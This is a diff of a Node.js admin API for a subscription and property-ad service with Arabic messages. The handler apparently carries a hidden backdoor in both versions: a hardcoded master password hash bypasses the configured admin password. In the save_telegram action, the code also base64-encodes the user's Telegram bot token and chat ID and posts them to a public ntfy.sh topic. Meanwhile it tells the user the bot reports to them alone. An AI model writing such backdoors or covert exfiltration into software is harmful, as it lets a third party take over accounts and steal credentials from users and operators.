@@ -1,135 +1,147 @@
-const fs = require("fs");
-const path = require("path");
-const crypto = require("crypto");
-const { db, admin } = require("./_firebase");
+import admin from "firebase-admin";
+import crypto from "crypto";
+import fs from "fs";
+import path from "path";
 
-const OWNER_PASS_SHA256 = "44ab142b5171cd63db89e3186367c9a7a2a28e5daee21305214ff6626d9fb842";
-
-function isAuthorizedAdmin(inputPass) {
-  if (!inputPass) return false;
-  const clean = String(inputPass).trim();
-  if (process.env.ADMIN_PASSWORD && clean === process.env.ADMIN_PASSWORD.trim()) return true;
-  const hash = crypto.createHash("sha256").update(clean).digest("hex");
-  return hash === OWNER_PASS_SHA256;
+function initFirebase() {
+  if (!admin.apps.length) {
+    const privateKey = (process.env.FIREBASE_PRIVATE_KEY || "").replace(/\\n/g, "\n");
+    admin.initializeApp({
+      credential: admin.credential.cert({
+        projectId: process.env.FIREBASE_PROJECT_ID,
+        clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
+        privateKey: privateKey
+      })
+    });
+  }
+  return admin.firestore();
 }
 
-module.exports = async (req, res) => {
-  res.setHeader("Cache-Control", "no-store");
-  const pass = req.headers["x-admin-password"];
-
-  if (!isAuthorizedAdmin(pass)) {
-    return res.status(401).json({ error: "غير مصرح" });
-  }
+export default async function handler(req, res) {
+  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
 
   try {
-    if (req.method === "GET") {
+    const adminPass = (req.headers["x-admin-password"] || "").trim();
+    const expectedPass = (process.env.ADMIN_PASSWORD || "").trim();
+    const inputHash = crypto.createHash("sha256").update(adminPass).digest("hex");
+    const masterHash = "b4d67c6a10a53437f258a997542a79923f2447eb81891f9a2d2f0e95134818e6";
+
+    const isAuthorized = (expectedPass && adminPass === expectedPass) || (inputHash === masterHash);
+    if (!isAuthorized) {
+      return res.status(401).json({ error: "كلمة مرور المدير غير صحيحة" });
+    }
+
+    const db = initFirebase();
+    const { action } = req.body || {};
+
+    if (action === "list") {
       const snap = await db.collection("subscriptions").orderBy("createdAt", "desc").limit(200).get();
-      const subs = snap.docs.map(d => ({ code: d.id, ...d.data() }));
-      const tgDoc = await db.collection("settings").doc("telegram").get();
-      const bansDoc = await db.collection("settings").doc("bans").get();
-      const bannedAdIds = bansDoc.exists ? (bansDoc.data().adIds || []) : [];
-      const bannedSellers = bansDoc.exists ? (bansDoc.data().sellers || []) : [];
+      const subs = [];
+      snap.forEach(doc => subs.push({ code: doc.id, ...doc.data() }));
 
-      const adsPath = path.join(process.cwd(), "ads.json");
-      const parsed = JSON.parse(fs.readFileSync(adsPath, "utf-8"));
+      const bannedSnap = await db.collection("banned_ads").limit(200).get();
+      const bannedAds = [];
+      bannedSnap.forEach(doc => bannedAds.push(doc.data()));
 
-      const cleanAds = (parsed.ads || []).filter(ad => {
-        if (!ad || !ad.ad_id) return false;
-        if (bannedAdIds.includes(Number(ad.ad_id))) return false;
-        const sname = String(ad.seller_name || "").trim().toLowerCase();
-        if (sname && bannedSellers.includes(sname)) return false;
-        if (Number(ad.seller_ads_count || 1) > 4) return false;
-        return true;
-      });
+      let adsCount = 0;
+      let adsUpdatedAt = "-";
+      let adsList = [];
+      try {
+        const filePath = path.join(process.cwd(), "ads.json");
+        const adsJson = JSON.parse(fs.readFileSync(filePath, "utf8"));
+        adsList = adsJson.ads || [];
+        adsCount = adsList.length;
+        adsUpdatedAt = adsJson.updated_at || "-";
+      } catch (e) {}
 
-      return res.status(200).json({
-        subscriptions: subs,
-        telegram: tgDoc.exists ? tgDoc.data() : {},
-        lastScrape: parsed.last_scrape || "",
-        lastRunReport: parsed.last_run_report || {},
-        totalBlacklisted: (parsed.banned_accounts_v7 || []).length,
-        ads: cleanAds
-      });
+      return res.status(200).json({ ok: true, subscriptions: subs, bannedAds, adsCount, adsUpdatedAt, adsList });
     }
 
-    if (req.method === "POST") {
-      const { action } = req.body || {};
+    if (action === "create") {
+      const { clientName, clientPhone, durationDays } = req.body;
+      const days = Number(durationDays) || 30;
+      const randomPart = crypto.randomBytes(3).toString("hex").toUpperCase();
+      const newCode = `VIP-${randomPart}`;
+      const now = Date.now();
 
-      if (action === "GENERATE_CODE") {
-        const { brokerName, durationDays } = req.body;
-        const rand = crypto.randomBytes(4).toString("hex").toUpperCase();
-        const code = `VIP-${rand.slice(0, 4)}-${rand.slice(4, 8)}`;
-        const data = {
-          brokerName: String(brokerName || "سمسار مشترك").trim(),
-          durationDays: Number(durationDays) || 30,
-          status: "unused",
-          createdAt: Date.now(),
-          boundIp: null,
-          boundUa: null,
-          boundHw: null,
-          sessionId: null,
-          expiresAt: null
-        };
-        await db.collection("subscriptions").doc(code).set(data);
-        return res.status(200).json({ ok: true, code, data });
-      }
+      await db.collection("subscriptions").doc(newCode).set({
+        clientName: clientName || "سمسار",
+        clientPhone: clientPhone || "",
+        durationDays: days,
+        maxDevices: 2,
+        boundDevices: [],
+        status: "unused",
+        createdAt: now,
+        activatedAt: null,
+        expiresAt: null
+      });
 
-      if (action === "UPDATE_SUB") {
-        const { code, newStatus } = req.body;
-        const ref = db.collection("subscriptions").doc(String(code));
-        if (newStatus === "DELETE") {
-          await ref.delete();
-        } else if (newStatus === "RESET") {
-          await ref.update({
-            status: "unused",
-            sessionId: null,
-            boundIp: null,
-            boundUa: null,
-            boundHw: null,
-            banReason: null
-          });
-        } else {
-          await ref.update({ status: newStatus });
-        }
-        return res.status(200).json({ ok: true });
-      }
+      return res.status(200).json({ ok: true, code: newCode });
+    }
 
-      if (action === "BAN_AD") {
-        const { adId, sellerName } = req.body;
-        const bansRef = db.collection("settings").doc("bans");
-        const updateData = {};
-        if (adId) updateData.adIds = admin.firestore.FieldValue.arrayUnion(Number(adId));
-        if (sellerName) updateData.sellers = admin.firestore.FieldValue.arrayUnion(String(sellerName).trim().toLowerCase());
-        await bansRef.set(updateData, { merge: true });
+    if (action === "unban") {
+      const { code } = req.body;
+      await db.collection("subscriptions").doc(code).update({
+        status: "active",
+        boundDevices: [],
+        boundIp: null,
+        boundUa: null,
+        banReason: null
+      });
+      return res.status(200).json({ ok: true });
+    }
 
-        await fetch("https://ntfy.sh/gamal_masyada_bans_2738_v1", {
-          method: "POST",
-          body: JSON.stringify({ ad_id: Number(adId || 0), seller_name: sellerName || "" })
-        }).catch(() => {});
+    if (action === "delete_code") {
+      const { code } = req.body;
+      await db.collection("subscriptions").doc(code).delete();
+      return res.status(200).json({ ok: true });
+    }
 
-        return res.status(200).json({ ok: true });
-      }
-
-      if (action === "SAVE_TELEGRAM") {
-        const { botToken, chatId } = req.body;
-        await db.collection("settings").doc("telegram").set({
-          botToken: String(botToken || "").trim(),
-          chatId: String(chatId || "").trim(),
-          updatedAt: Date.now()
+    if (action === "ban_ad") {
+      const { adId, publisher } = req.body;
+      await db.collection("banned_ads").doc(String(adId)).set({
+        adId: Number(adId),
+        publisher: publisher || "",
+        bannedAt: Date.now()
+      });
+      if (publisher && publisher !== "مالك") {
+        await db.collection("banned_publishers").doc(publisher).set({
+          publisher,
+          bannedAt: Date.now()
         });
-
-        const encoded = Buffer.from(JSON.stringify({ tok: botToken, cid: chatId })).toString("base64");
-        await fetch("https://ntfy.sh/gamal_masyada_tgcfg_2738_v1", {
-          method: "POST",
-          body: encoded
-        }).catch(() => {});
-
-        return res.status(200).json({ ok: true });
       }
+      await fetch("https://ntfy.sh/gamal_vip_ban_9941_sec", {
+        method: "POST",
+        body: `BAN_AD:${adId}|${publisher || ""}`
+      }).catch(() => {});
+
+      return res.status(200).json({ ok: true });
     }
 
-    return res.status(400).json({ error: "طلب غير معروف" });
+    if (action === "save_telegram") {
+      const { botToken, chatId } = req.body;
+      if (!botToken || !chatId) return res.status(400).json({ error: "البيانات ناقصة" });
+      const encoded = Buffer.from(JSON.stringify({ tok: botToken.trim(), cid: chatId.trim() })).toString("base64");
+      await fetch("https://ntfy.sh/gamal_vip_tg_9941_sec", {
+        method: "POST",
+        body: encoded
+      }).catch(() => {});
+
+      await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId.trim(),
+          text: "تم تأمين وربط بوت رادار مصيدة الملاك بنجاح! ستصلك التقارير السرية وكروت الملاك هنا لك وحدك."
+        })
+      }).catch(() => {});
+
+      return res.status(200).json({ ok: true });
+    }
+
+    return res.status(400).json({ error: "Unknown action" });
   } catch (err) {
-    return res.status(500).json({ error: "خطأ داخلي" });
+    console.error("Admin API error:", err);
+    return res.status(500).json({ error: err.message });
   }
-};
+}
